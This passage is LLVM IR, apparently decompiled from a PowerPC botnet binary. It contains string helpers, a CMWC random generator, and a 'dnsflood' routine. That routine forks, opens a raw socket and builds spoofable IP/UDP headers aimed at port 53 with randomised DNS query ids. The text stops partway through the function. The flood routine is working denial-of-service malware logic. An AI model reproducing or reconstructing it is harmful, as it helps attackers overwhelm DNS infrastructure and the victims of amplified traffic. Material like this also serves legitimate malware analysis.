  br label %dec_label_pc_10001ec0

dec_label_pc_10001ec0:                            ; preds = %dec_label_pc_10001e78, %dec_label_pc_10001e94
  %v1_10001ec4 = add i32 %v1_10001e7c, 16
  %v2_10001ec4 = inttoptr i32 %v1_10001ec4 to i32*
  %v3_10001ec4 = load i32, i32* %v2_10001ec4, align 4
  %v1_10001ec8 = inttoptr i32 %v3_10001ec4 to i32*
  %v2_10001ec8 = load i32, i32* %v1_10001ec8, align 4
  %v1_10001ed8 = add i32 %v1_10001e7c, 12
  %v2_10001ed8 = inttoptr i32 %v1_10001ed8 to i32*
  %v3_10001ed8 = load i32, i32* %v2_10001ed8, align 4
  store i32 %v3_10001ed8, i32* @r5, align 4
  store i32 268443372, i32* @lr, align 4
  %v4_10001ee8 = call i32 @bcopy(i32 %v2_10001ec8, i32 ptrtoint (i32* @global_var_10045180.92 to i32), i32 %v3_10001ed8, i32 %v1_10001e7c)
  %v3_10001ef0.pre = load i32, i32* @global_var_10045180.92, align 4
  br label %dec_label_pc_10001eec

dec_label_pc_10001eec:                            ; preds = %entry, %dec_label_pc_10001ec0
  %v3_10001ef0 = phi i32 [ %v1_10001e54, %entry ], [ %v3_10001ef0.pre, %dec_label_pc_10001ec0 ]
  ret i32 %v3_10001ef0

; uselistorder directives
  uselistorder i32 %v3_10001ed8, { 1, 0 }
  uselistorder i32 %v1_10001e7c, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10001eec, { 1, 0 }
  uselistorder label %dec_label_pc_10001ec0, { 1, 0 }
}

define i32 @ChangetoDnsNameFormat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r3, align 4
  %v0_10001f40 = call i32 @__GI_strlen()
  %v2_10001f48 = add i32 %v0_10001f40, %arg2
  %v3_10001f54 = inttoptr i32 %v2_10001f48 to i16*
  store i16 11776, i16* %v3_10001f54, align 2
  store i32 %arg2, i32* @r3, align 4
  %v0_1000202010 = call i32 @__GI_strlen()
  %v2_1000202812 = icmp eq i32 %v0_1000202010, 0
  br i1 %v2_1000202812, label %dec_label_pc_10002030, label %dec_label_pc_10001f64

dec_label_pc_10001f64:                            ; preds = %entry, %dec_label_pc_10002008
  %storemerge117 = phi i32 [ %v1_1000200c, %dec_label_pc_10002008 ], [ 0, %entry ]
  %stack_var_-24.216 = phi i8* [ %stack_var_-24.1, %dec_label_pc_10002008 ], [ %arg1, %entry ]
  %stack_var_-36.215 = phi i32 [ %stack_var_-36.1, %dec_label_pc_10002008 ], [ 0, %entry ]
  %v2_10001f70 = add i32 %storemerge117, %arg2
  %v1_10001f74 = inttoptr i32 %v2_10001f70 to i8*
  %v2_10001f74 = load i8, i8* %v1_10001f74, align 1
  %v3_10001f7c = icmp eq i8 %v2_10001f74, 46
  br i1 %v3_10001f7c, label %dec_label_pc_10001f84, label %dec_label_pc_10002008

dec_label_pc_10001f84:                            ; preds = %dec_label_pc_10001f64
  %fold = sub i32 %storemerge117, %stack_var_-36.215
  %v4_10001f9c = ptrtoint i8* %stack_var_-24.216 to i32
  %v1_10001fa0 = trunc i32 %fold to i8
  store i8 %v1_10001fa0, i8* %stack_var_-24.216, align 1
  %v1_10001fa8 = add i32 %v4_10001f9c, 1
  %stack_var_-24.02 = inttoptr i32 %v1_10001fa8 to i8*
  %v2_10001ff43 = icmp sgt i32 %storemerge117, %stack_var_-36.215
  br i1 %v2_10001ff43, label %dec_label_pc_10001fb4, label %dec_label_pc_10001ffc

dec_label_pc_10001fb4:                            ; preds = %dec_label_pc_10001f84, %dec_label_pc_10001fb4
  %stack_var_-24.08 = phi i8* [ %stack_var_-24.0, %dec_label_pc_10001fb4 ], [ %stack_var_-24.02, %dec_label_pc_10001f84 ]
  %stack_var_-24.0.in7 = phi i32 [ %v1_10001fd8, %dec_label_pc_10001fb4 ], [ %v1_10001fa8, %dec_label_pc_10001f84 ]
  %stack_var_-36.06 = phi i32 [ %v1_10001fe4, %dec_label_pc_10001fb4 ], [ %stack_var_-36.215, %dec_label_pc_10001f84 ]
  %v2_10001fc0 = add i32 %stack_var_-36.06, %arg2
  %v1_10001fc4 = inttoptr i32 %v2_10001fc0 to i8*
  %v2_10001fc4 = load i8, i8* %v1_10001fc4, align 1
  store i8 %v2_10001fc4, i8* %stack_var_-24.08, align 1
  %v1_10001fd8 = add i32 %stack_var_-24.0.in7, 1
  %v1_10001fe4 = add nsw i32 %stack_var_-36.06, 1
  %stack_var_-24.0 = inttoptr i32 %v1_10001fd8 to i8*
  %v2_10001ff4 = icmp slt i32 %v1_10001fe4, %storemerge117
  br i1 %v2_10001ff4, label %dec_label_pc_10001fb4, label %dec_label_pc_10001ffc

dec_label_pc_10001ffc:                            ; preds = %dec_label_pc_10001fb4, %dec_label_pc_10001f84
  %stack_var_-36.0.lcssa = phi i32 [ %stack_var_-36.215, %dec_label_pc_10001f84 ], [ %storemerge117, %dec_label_pc_10001fb4 ]
  %stack_var_-24.0.lcssa = phi i8* [ %stack_var_-24.02, %dec_label_pc_10001f84 ], [ %stack_var_-24.0, %dec_label_pc_10001fb4 ]
  %v1_10002000 = add i32 %stack_var_-36.0.lcssa, 1
  br label %dec_label_pc_10002008

dec_label_pc_10002008:                            ; preds = %dec_label_pc_10001f64, %dec_label_pc_10001ffc
  %stack_var_-36.1 = phi i32 [ %v1_10002000, %dec_label_pc_10001ffc ], [ %stack_var_-36.215, %dec_label_pc_10001f64 ]
  %stack_var_-24.1 = phi i8* [ %stack_var_-24.0.lcssa, %dec_label_pc_10001ffc ], [ %stack_var_-24.216, %dec_label_pc_10001f64 ]
  %v1_1000200c = add i32 %storemerge117, 1
  store i32 %arg2, i32* @r3, align 4
  %v0_10002020 = call i32 @__GI_strlen()
  %v2_10002028 = icmp ult i32 %v1_1000200c, %v0_10002020
  br i1 %v2_10002028, label %dec_label_pc_10001f64, label %dec_label_pc_10002030

dec_label_pc_10002030:                            ; preds = %entry, %dec_label_pc_10002008
  %stack_var_-24.2.lcssa = phi i8* [ %arg1, %entry ], [ %stack_var_-24.1, %dec_label_pc_10002008 ]
  %v0_10002020.lcssa = phi i32 [ %v0_1000202010, %entry ], [ %v0_10002020, %dec_label_pc_10002008 ]
  store i8 0, i8* %stack_var_-24.2.lcssa, align 1
  ret i32 %v0_10002020.lcssa

; uselistorder directives
  uselistorder i32 %v1_10001fe4, { 1, 0 }
  uselistorder i32 %v1_10001fd8, { 1, 0 }
  uselistorder i32 %stack_var_-36.06, { 1, 0 }
  uselistorder i8* %stack_var_-24.02, { 1, 0 }
  uselistorder i32 %stack_var_-36.215, { 4, 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-24.216, { 2, 0, 1 }
  uselistorder i32 %storemerge117, { 5, 0, 4, 2, 3, 1 }
  uselistorder i32 %v0_1000202010, { 1, 0 }
  uselistorder i32 %arg2, { 4, 1, 2, 3, 0, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10002030, { 1, 0 }
  uselistorder label %dec_label_pc_10002008, { 1, 0 }
  uselistorder label %dec_label_pc_10001fb4, { 1, 0 }
  uselistorder label %dec_label_pc_10001f64, { 1, 0 }
}

define i32 @init_rand(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_100456d4.95, align 4
  %v1_1000208c = add i32 %arg1, -1640531527
  store i32 %v1_1000208c, i32* @global_var_100456d8.96, align 4
  %v1_100020a4 = add i32 %arg1, 1013904242
  store i32 %v1_100020a4, i32* @global_var_100456dc.97, align 4
  br label %dec_label_pc_100020c0

dec_label_pc_100020c0:                            ; preds = %entry, %dec_label_pc_100020c0
  %storemerge12 = phi i32 [ 3, %entry ], [ %v1_10002128, %dec_label_pc_100020c0 ]
  %v1_100020c8 = mul i32 %storemerge12, 4
  %v2_100020d8 = add i32 %v1_100020c8, add (i32 ptrtoint (i32* @global_var_100456d4.95 to i32), i32 -12)
  %v1_100020dc = inttoptr i32 %v2_100020d8 to i32*
  %v2_100020dc = load i32, i32* %v1_100020dc, align 4
  %v2_100020f4 = add i32 %v1_100020c8, add (i32 ptrtoint (i32* @global_var_100456d4.95 to i32), i32 -8)
  %v1_100020f8 = inttoptr i32 %v2_100020f4 to i32*
  %v2_100020f8 = load i32, i32* %v1_100020f8, align 4
  %v2_100020fc = xor i32 %storemerge12, -1640531527
  %v2_10002104 = xor i32 %v2_100020fc, %v2_100020dc
  %v1_1000210c = xor i32 %v2_10002104, %v2_100020f8
  %v2_1000211c = add i32 %v1_100020c8, ptrtoint (i32* @global_var_100456d4.95 to i32)
  %v2_10002120 = inttoptr i32 %v2_1000211c to i32*
  store i32 %v1_1000210c, i32* %v2_10002120, align 4
  %v1_10002128 = add nuw nsw i32 %storemerge12, 1
  %tmp7 = icmp slt i32 %v1_10002128, 4096
  br i1 %tmp7, label %dec_label_pc_100020c0, label %dec_label_pc_1000213c

dec_label_pc_1000213c:                            ; preds = %dec_label_pc_100020c0
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_100020c8, { 2, 1, 0 }
  uselistorder i32 %storemerge12, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_100020c0, { 1, 0 }
}

define i32 @rand_cmwc() local_unnamed_addr {
entry:
  %v3_10002174 = load i32, i32* @global_var_10040758.98, align 4
  %v1_10002178 = add i32 %v3_10002174, 1
  %v1_1000217c = urem i32 %v1_10002178, 4096
  store i32 %v1_1000217c, i32* @global_var_10040758.98, align 4
  %v1_10002198 = mul nuw nsw i32 %v1_1000217c, 4
  %v2_1000219c = add i32 %v1_10002198, ptrtoint (i32* @global_var_100456d4.95 to i32)
  %v1_100021a0 = inttoptr i32 %v2_1000219c to i32*
  %v2_100021a0 = load i32, i32* %v1_100021a0, align 4
  %v6_100021c4 = udiv i32 %v2_100021a0, 228675
  %v2_100021c8 = mul i32 %v2_100021a0, 18782
  store i32 %v6_100021c4, i32* @r8, align 4
  %v3_100021d8 = load i32, i32* @global_var_10040754.99, align 4
  %v2_100021e4 = add i32 %v3_100021d8, %v2_100021c8
  %v3_100021e4 = icmp ult i32 %v2_100021e4, %v3_100021d8
  %v4_100021e8 = zext i1 %v3_100021e4 to i32
  %v5_100021e8 = add nuw nsw i32 %v4_100021e8, %v6_100021c4
  %v2_10002218 = add i32 %v5_100021e8, %v2_100021e4
  %v2_1000222c = icmp ult i32 %v2_10002218, %v5_100021e8
  br i1 %v2_1000222c, label %dec_label_pc_10002234, label %dec_label_pc_10002254

dec_label_pc_10002234:                            ; preds = %entry
  %v1_10002238 = add i32 %v2_10002218, 1
  %v1_10002248 = add nuw nsw i32 %v5_100021e8, 1
  br label %dec_label_pc_10002254

dec_label_pc_10002254:                            ; preds = %entry, %dec_label_pc_10002234
  %storemerge = phi i32 [ %v1_10002248, %dec_label_pc_10002234 ], [ %v5_100021e8, %entry ]
  %stack_var_-36.0 = phi i32 [ %v1_10002238, %dec_label_pc_10002234 ], [ %v2_10002218, %entry ]
  store i32 %storemerge, i32* @global_var_10040754.99, align 4
  store i32 %v1_1000217c, i32* @r10, align 4
  %v2_10002264 = sub i32 -2, %stack_var_-36.0
  store i32 %v2_10002264, i32* %v1_100021a0, align 4
  %v0_10002284 = load i32, i32* @r10, align 4
  %v1_10002284 = mul i32 %v0_10002284, 4
  %v2_10002288 = add i32 %v1_10002284, ptrtoint (i32* @global_var_100456d4.95 to i32)
  %v1_1000228c = inttoptr i32 %v2_10002288 to i32*
  %v2_1000228c = load i32, i32* %v1_1000228c, align 4
  ret i32 %v2_1000228c

; uselistorder directives
  uselistorder i32 %v5_100021e8, { 0, 2, 3, 1 }
  uselistorder i32 %v3_100021d8, { 1, 0 }
  uselistorder i32 %v6_100021c4, { 1, 0 }
  uselistorder i32 %v2_100021a0, { 1, 0 }
  uselistorder i32 %v1_1000217c, { 2, 0, 1 }
  uselistorder i32* @global_var_100456d4.95, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_100456d4.95 to i32), { 2, 3, 4, 0, 1 }
  uselistorder label %dec_label_pc_10002254, { 1, 0 }
}

define i32 @myStrCat(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_100022cc12 = load i8, i8* %arg1, align 1
  %v3_100022d415 = icmp eq i8 %v2_100022cc12, 0
  br i1 %v3_100022d415, label %dec_label_pc_1000230c.preheader, label %dec_label_pc_100022bc

dec_label_pc_100022bc:                            ; preds = %entry, %dec_label_pc_100022bc
  %v4_100022c816 = phi i32 [ %v1_100022c0, %dec_label_pc_100022bc ], [ %tmp, %entry ]
  %v1_100022c0 = add i32 %v4_100022c816, 1
  %v5_100022c4 = inttoptr i32 %v1_100022c0 to i8*
  %v2_100022cc = load i8, i8* %v5_100022c4, align 1
  %v3_100022d4 = icmp eq i8 %v2_100022cc, 0
  br i1 %v3_100022d4, label %dec_label_pc_1000230c.preheader, label %dec_label_pc_100022bc

dec_label_pc_1000230c.preheader:                  ; preds = %dec_label_pc_100022bc, %entry
  %stack_var_-24.0.lcssa = phi i8* [ %arg1, %entry ], [ %v5_100022c4, %dec_label_pc_100022bc ]
  %stack_var_-20.03 = inttoptr i32 %arg2 to i8*
  %v2_100023104 = load i8, i8* %stack_var_-20.03, align 1
  %v3_100023187 = icmp eq i8 %v2_100023104, 0
  br i1 %v3_100023187, label %dec_label_pc_10002320, label %dec_label_pc_100022e0

dec_label_pc_100022e0:                            ; preds = %dec_label_pc_1000230c.preheader, %dec_label_pc_100022e0
  %stack_var_-20.010 = phi i8* [ %stack_var_-20.0, %dec_label_pc_100022e0 ], [ %stack_var_-20.03, %dec_label_pc_1000230c.preheader ]
  %stack_var_-24.19 = phi i8* [ %v5_100022fc, %dec_label_pc_100022e0 ], [ %stack_var_-24.0.lcssa, %dec_label_pc_1000230c.preheader ]
  %stack_var_-20.0.in8 = phi i32 [ %v1_10002304, %dec_label_pc_100022e0 ], [ %arg2, %dec_label_pc_1000230c.preheader ]
  %v2_100022e4 = load i8, i8* %stack_var_-20.010, align 1
  %v4_100022ec = ptrtoint i8* %stack_var_-24.19 to i32
  store i8 %v2_100022e4, i8* %stack_var_-24.19, align 1
  %v1_100022f8 = add i32 %v4_100022ec, 1
  %v5_100022fc = inttoptr i32 %v1_100022f8 to i8*
  %v1_10002304 = add i32 %stack_var_-20.0.in8, 1
  %stack_var_-20.0 = inttoptr i32 %v1_10002304 to i8*
  %v2_10002310 = load i8, i8* %stack_var_-20.0, align 1
  %v3_10002318 = icmp eq i8 %v2_10002310, 0
  br i1 %v3_10002318, label %dec_label_pc_10002320, label %dec_label_pc_100022e0

dec_label_pc_10002320:                            ; preds = %dec_label_pc_100022e0, %dec_label_pc_1000230c.preheader
  %stack_var_-24.1.lcssa = phi i8* [ %stack_var_-24.0.lcssa, %dec_label_pc_1000230c.preheader ], [ %v5_100022fc, %dec_label_pc_100022e0 ]
  %v4_10002320 = ptrtoint i8* %stack_var_-24.1.lcssa to i32
  store i8 0, i8* %stack_var_-24.1.lcssa, align 1
  ret i32 %v4_10002320

; uselistorder directives
  uselistorder i8* %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %v1_10002304, { 1, 0 }
  uselistorder i8* %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_100022c0, { 1, 0 }
  uselistorder label %dec_label_pc_100022e0, { 1, 0 }
  uselistorder label %dec_label_pc_100022bc, { 1, 0 }
}

define i32 @replStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_10002364 = icmp eq i32 %arg2, 0
  br i1 %v3_10002364, label %dec_label_pc_1000236c, label %dec_label_pc_10002378

dec_label_pc_1000236c:                            ; preds = %entry
  br label %dec_label_pc_10002414

dec_label_pc_10002378:                            ; preds = %entry
  store i32 %arg1, i32* @r3, align 4
  %v0_1000237c = call i32 @__GI_strlen()
  %v2_10002388 = mul i32 %v0_1000237c, %arg2
  %v2_10002390 = add i32 %v2_10002388, %arg2
  store i32 %v2_10002390, i32* @r3, align 4
  store i32 268444572, i32* @lr, align 4
  %v0_10002398 = call i32 @malloc()
  %v3_100023a8 = icmp eq i32 %v0_10002398, 0
  br i1 %v3_100023a8, label %dec_label_pc_100023b0, label %dec_label_pc_100023bc

dec_label_pc_100023b0:                            ; preds = %dec_label_pc_10002378
  br label %dec_label_pc_10002414

dec_label_pc_100023bc:                            ; preds = %dec_label_pc_10002378
  %v4_100023bc = inttoptr i32 %v0_10002398 to i8*
  store i8 0, i8* %v4_100023bc, align 1
  %v5_100023d0 = call i32 @myStrCat(i8* %v4_100023bc, i32 %arg1, i32 %v0_10002398)
  %v1_100023f83 = add i32 %arg2, -1
  %v3_100024046 = icmp eq i32 %v1_100023f83, 0
  br i1 %v3_100024046, label %dec_label_pc_1000240c, label %dec_label_pc_100023e0

dec_label_pc_100023e0:                            ; preds = %dec_label_pc_100023bc, %dec_label_pc_100023e0
  %stack_var_-20.07 = phi i32 [ %v1_100023f89, %dec_label_pc_100023e0 ], [ %arg2, %dec_label_pc_100023bc ]
  %v1_100023f89 = phi i32 [ %v1_100023f8, %dec_label_pc_100023e0 ], [ %v1_100023f83, %dec_label_pc_100023bc ]
  %storemerge28 = phi i32 [ %v4_100023e8, %dec_label_pc_100023e0 ], [ %v5_100023d0, %dec_label_pc_100023bc ]
  %v3_100023e8 = inttoptr i32 %storemerge28 to i8*
  %v4_100023e8 = call i32 @myStrCat(i8* %v3_100023e8, i32 %arg1, i32 %stack_var_-20.07)
  %v1_100023f8 = add i32 %v1_100023f89, -1
  %v3_10002404 = icmp eq i32 %v1_100023f8, 0
  br i1 %v3_10002404, label %dec_label_pc_1000240c, label %dec_label_pc_100023e0

dec_label_pc_1000240c:                            ; preds = %dec_label_pc_100023e0, %dec_label_pc_100023bc
  br label %dec_label_pc_10002414

dec_label_pc_10002414:                            ; preds = %dec_label_pc_100023b0, %dec_label_pc_1000236c, %dec_label_pc_1000240c
  %stack_var_-16.0 = phi i32 [ 0, %dec_label_pc_1000236c ], [ 0, %dec_label_pc_100023b0 ], [ %v0_10002398, %dec_label_pc_1000240c ]
  ret i32 %stack_var_-16.0

; uselistorder directives
  uselistorder i32 %v1_100023f8, { 1, 0 }
  uselistorder i32 %v1_100023f89, { 1, 0 }
  uselistorder i32 %v0_10002398, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_10002414, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100023e0, { 1, 0 }
}

define i32 @setup_udp_header(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @dnsflood(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-4744 = alloca i16*, align 4
  %stack_var_-580 = alloca i32, align 4
  %stack_var_-4692 = alloca i32, align 4
  store i32 268444784, i32* @lr, align 4
  %v0_1000246c = call i32 @listFork()
  %v3_10002474 = icmp eq i32 %v0_1000246c, 0
  br i1 %v3_10002474, label %dec_label_pc_1000247c, label %dec_label_pc_10002ba0

dec_label_pc_1000247c:                            ; preds = %entry
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_10002494 = add i32 %arg1, 12
  %v2_10002494 = inttoptr i32 %v1_10002494 to i32*
  %v3_10002494 = load i32, i32* %v2_10002494, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_100024b4 = add i32 %arg1, 4
  %v2_100024b4 = inttoptr i32 %v1_100024b4 to i32*
  %v3_100024b4 = load i32, i32* %v2_100024b4, align 4
  store i32 %arg1, i32* %r9.global-to-local, align 4
  %v1_100024c0 = add i32 %arg1, 24
  %v2_100024c0 = inttoptr i32 %v1_100024c0 to i32*
  %v3_100024c0 = load i32, i32* %v2_100024c0, align 4
  store i32 268444888, i32* @lr, align 4
  %v3_100024d4 = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp50 = icmp sgt i32 %v3_100024d4, -1
  br i1 %tmp50, label %dec_label_pc_100024f4, label %dec_label_pc_100024ec

dec_label_pc_100024ec:                            ; preds = %dec_label_pc_1000247c
  %v0_100024f0 = call i32 @__GI_exit()
  br label %dec_label_pc_100024f4

dec_label_pc_100024f4:                            ; preds = %dec_label_pc_1000247c, %dec_label_pc_100024ec
  store i32 268444924, i32* @lr, align 4
  %v1_100024f8 = call i32 @__GI_time(i32 0)
  %v1_10002504 = call i32 @init_rand(i32 %v1_100024f8)
  %v2_10002508 = ptrtoint i32* %stack_var_-4692 to i32
  store i32 4096, i32* %r9.global-to-local, align 4
  store i32 %v2_10002508, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 4096, i32* @r5, align 4
  store i32 268444960, i32* @lr, align 4
  %v0_1000251c = call i32 @__GI_memset()
  store i32 5, i32* %r9.global-to-local, align 4
  %v1_10002534 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10002534, i32* %stack_var_-4692, align 4
  store i32 4, i32* %r9.global-to-local, align 4
  %v1_10002548 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10002548, i32* %stack_var_-4692, align 4
  %v3_10002558 = or i32 %v2_10002508, 1
  %v4_10002558 = inttoptr i32 %v3_10002558 to i8*
  store i8 0, i8* %v4_10002558, align 1
  store i32 %v2_10002508, i32* %r9.global-to-local, align 4
  %v3_10002564 = or i32 %v2_10002508, 2
  %v4_10002564 = inttoptr i32 %v3_10002564 to i16*
  store i16 58, i16* %v4_10002564, align 2
  store i32 54321, i32* @r3, align 4
  %v1_10002570 = call i32 @htonl(i32 54321)
  %v1_10002580 = trunc i32 %v1_10002570 to i16
  %v3_10002580 = add i32 %v2_10002508, 4
  %v4_10002580 = inttoptr i32 %v3_10002580 to i16*
  store i16 %v1_10002580, i16* %v4_10002580, align 4
  %v3_1000258c = add i32 %v2_10002508, 6
  %v4_1000258c = inttoptr i32 %v3_1000258c to i16*
  store i16 0, i16* %v4_1000258c, align 2
  %v3_10002598 = add i32 %v2_10002508, 8
  %v4_10002598 = inttoptr i32 %v3_10002598 to i8*
  store i8 -1, i8* %v4_10002598, align 4
  %v3_100025a4 = add i32 %v2_10002508, 9
  %v4_100025a4 = inttoptr i32 %v3_100025a4 to i8*
  store i8 17, i8* %v4_100025a4, align 1
  %v3_100025b0 = add i32 %v2_10002508, 10
  %v4_100025b0 = inttoptr i32 %v3_100025b0 to i16*
  store i16 0, i16* %v4_100025b0, align 2
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  store i32 268445120, i32* @lr, align 4
  %v2_100025bc = call i32 @inet_addr(i32 ptrtoint ([14 x i8]* @global_var_1002a5c8.101 to i32))
  %v2_100025c8 = add i32 %v2_10002508, 12
  %v3_100025c8 = inttoptr i32 %v2_100025c8 to i32*
  store i32 %v2_100025bc, i32* %v3_100025c8, align 4
  store i32 20, i32* %r9.global-to-local, align 4
  %v2_100025e4 = add i32 %v2_10002508, 20
  %v5_100025e8 = inttoptr i32 %v2_100025e4 to i16*
  %v1_100025f0 = urem i32 %v3_100024c0, 65536
  store i32 %v1_100025f0, i32* @r3, align 4
  %v1_100025f8 = call i32 @htons(i32 %v1_100025f0)
  %sext = mul i32 %v1_100025f8, 65536
  %v1_100025fc = sdiv i32 %sext, 65536
  store i32 %v2_100025e4, i32* %r9.global-to-local, align 4
  %v1_10002604 = trunc i32 %v1_100025fc to i16
  store i16 %v1_10002604, i16* %v5_100025e8, align 4
  store i32 53, i32* @r3, align 4
  %v1_1000260c = call i32 @htons(i32 53)
  %v1_10002618 = trunc i32 %v1_1000260c to i16
  %v3_10002618 = add i32 %v2_10002508, 22
  %v4_10002618 = inttoptr i32 %v3_10002618 to i16*
  store i16 %v1_10002618, i16* %v4_10002618, align 2
  %v3_10002624 = add i32 %v2_10002508, 26
  %v4_10002624 = inttoptr i32 %v3_10002624 to i16*
  store i16 0, i16* %v4_10002624, align 2
  store i32 28, i32* %r9.global-to-local, align 4
  %v2_10002640 = add i32 %v2_10002508, 28
  %v5_10002644 = inttoptr i32 %v2_10002640 to i16*
  %v0_10002648 = call i32 @rand_cmwc()
  %v1_10002650 = urem i32 %v0_10002648, 65536
  store i32 %v1_10002650, i32* @r3, align 4
  %v1_10002658 = call i32 @htons(i32 %v1_10002650)
  %sext5 = mul i32 %v1_10002658, 65536
  %v1_1000265c = sdiv i32 %sext5, 65536
  %v1_10002664 = trunc i32 %v1_1000265c to i16
  store i16 %v1_10002664, i16* %v5_10002644, align 4
  store i32 %v2_10002640, i32* %r9.global-to-local, align 4
  %v1_1000266c = add i32 %v2_10002508, 30
  %v2_1000266c = inttoptr i32 %v1_1000266c to i16*
  %v3_1000266c = load i16, i16* %v2_1000266c, align 2
  %v4_1000266c = zext i16 %v3_1000266c to i32
  %v1_10002670 = call i32 @__asm_rlwinm(i32 %v4_1000266c, i32 0, i32 24, i32 22)
  %v2_10002670 = trunc i32 %v1_10002670 to i16
  %v3_10002674 = load i32, i32* %r9.global-to-local, align 4
  %v4_10002674 = add i32 %v3_10002674, 2
  %v5_10002674 = inttoptr i32 %v4_10002674 to i16*
  store i16 %v2_10002670, i16* %v5_10002674, align 2
  store i32 %v2_10002640, i32* %r9.global-to-local, align 4
  %v3_1000267c = load i16, i16* %v2_1000266c, align 2
  %v1_10002688 = sext i16 %v3_1000267c to i32
  %v2_10002688 = call i32 @__asm_rlwinm(i32 %v1_10002688, i32 0, i32 23, i32 18)
  %v1_10002694 = trunc i32 %v2_10002688 to i16
  %v2_10002694 = load i32, i32* %r9.global-to-local, align 4
  %v3_10002694 = add i32 %v2_10002694, 2
  %v4_10002694 = inttoptr i32 %v3_10002694 to i16*
  store i16 %v1_10002694, i16* %v4_10002694, align 2
  store i32 %v2_10002640, i32* %r9.global-to-local, align 4
  %v3_1000269c = load i16, i16* %v2_1000266c, align 2
  %v4_1000269c = zext i16 %v3_1000269c to i32
  %v1_100026a0 = call i32 @__asm_rlwinm(i32 %v4_1000269c, i32 0, i32 19, i32 17)
  %v2_100026a0 = trunc i32 %v1_100026a0 to i16
  %v3_100026a4 = load i32, i32* %r9.global-to-local, align 4
  %v4_100026a4 = add i32 %v3_100026a4, 2
  %v5_100026a4 = inttoptr i32 %v4_100026a4 to i16*
  store i16 %v2_100026a0, i16* %v5_100026a4, align 2
  store i32 %v2_10002640, i32* %r9.global-to-local, align 4
  %v3_100026ac = load i16, i16* %v2_1000266c, align 2
  %v4_100026ac = zext i16 %v3_100026ac to i32
  %v1_100026b0 = call i32 @__asm_rlwinm(i32 %v4_100026ac, i32 0, i32 18, i32 16)
  %v2_100026b0 = trunc i32 %v1_100026b0 to i16
  %v3_100026b4 = load i32, i32* %r9.global-to-local, align 4
  %v4_100026b4 = add i32 %v3_100026b4, 2
  %v5_100026b4 = inttoptr i32 %v4_100026b4 to i16*
  store i16 %v2_100026b0, i16* %v5_100026b4, align 2
  store i32 %v2_10002640, i32* %r9.global-to-local, align 4
  %v3_100026bc = load i16, i16* %v2_1000266c, align 2
  %v1_100026c4 = or i16 %v3_100026bc, -32768
  store i16 %v1_100026c4, i16* %v2_1000266c, align 2
  store i32 %v2_10002640, i32* %r9.global-to-local, align 4
  %v3_100026d0 = load i16, i16* %v2_1000266c, align 2
  %v4_100026d0 = zext i16 %v3_100026d0 to i32
  %v1_100026d4 = call i32 @__asm_rlwinm(i32 %v4_100026d0, i32 0, i32 0, i32 30)
  %v2_100026d4 = trunc i32 %v1_100026d4 to i16
  %v3_100026d8 = load i32, i32* %r9.global-to-local, align 4
  %v4_100026d8 = add i32 %v3_100026d8, 2
  %v5_100026d8 = inttoptr i32 %v4_100026d8 to i16*
  store i16 %v2_100026d4, i16* %v5_100026d8, align 2
  store i32 %v2_10002640, i32* %r9.global-to-local, align 4
  %v3_100026e0 = load i16, i16* %v2_1000266c, align 2
  %v4_100026e0 = zext i16 %v3_100026e0 to i32
  %v1_100026e4 = call i32 @__asm_rlwinm(i32 %v4_100026e0, i32 0, i32 31, i32 29)
  %v2_100026e4 = trunc i32 %v1_100026e4 to i16
  %v3_100026e8 = load i32, i32* %r9.global-to-local, align 4
  %v4_100026e8 = add i32 %v3_100026e8, 2
  %v5_100026e8 = inttoptr i32 %v4_100026e8 to i16*
  store i16 %v2_100026e4, i16* %v5_100026e8, align 2
  store i32 %v2_10002640, i32* %r9.global-to-local, align 4
  %v3_100026f0 = load i16, i16* %v2_1000266c, align 2
  %v4_100026f0 = zext i16 %v3_100026f0 to i32
  %v1_100026f4 = call i32 @__asm_rlwinm(i32 %v4_100026f0, i32 0, i32 30, i32 28)
  %v2_100026f4 = trunc i32 %v1_100026f4 to i16
  %v3_100026f8 = load i32, i32* %r9.global-to-local, align 4
  %v4_100026f8 = add i32 %v3_100026f8, 2
  %v5_100026f8 = inttoptr i32 %v4_100026f8 to i16*
  store i16 %v2_100026f4, i16* %v5_100026f8, align 2
  store i32 %v2_10002640, i32* %r9.global-to-local, align 4
  %v3_10002700 = load i16, i16* %v2_1000266c, align 2
  %v4_10002700 = zext i16 %v3_10002700 to i32
  %v1_10002704 = call i32 @__asm_rlwinm(i32 %v4_10002700, i32 0, i32 29, i32 27)
  %v2_10002704 = trunc i32 %v1_10002704 to i16
  %v3_10002708 = load i32, i32* %r9.global-to-local, align 4
  %v4_10002708 = add i32 %v3_10002708, 2
  %v5_10002708 = inttoptr i32 %v4_10002708 to i16*
  store i16 %v2_10002704, i16* %v5_10002708, align 2
  store i32 %v2_10002640, i32* %r9.global-to-local, align 4
  %v3_10002710 = load i16, i16* %v2_1000266c, align 2
